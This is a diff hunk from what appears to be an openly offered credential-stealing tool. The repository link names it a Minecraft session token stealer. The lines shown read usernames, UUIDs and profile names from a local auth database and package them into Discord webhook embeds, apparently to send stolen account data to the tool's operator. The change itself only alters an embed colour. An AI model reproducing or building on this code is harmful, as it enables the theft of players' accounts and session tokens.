@@ -23,7 +23,7 @@ if __name__ == '__main__':
         email = auth_db[x].get('username')
         uuid, display_name_object = list(auth_db[x]['profiles'].items())[0]
 
-        embed = discord_webhook.DiscordEmbed(color=0xFFFFFF)
+        embed = discord_webhook.DiscordEmbed(color=0xFEFEFE)
         
         if i == 0:
             embed.set_author(name='Download on GitHub', url='https://github.com/WodxTV/Minecraft-Session-Token-Stealer', icon_url='https://github.com/fluidicon.png')
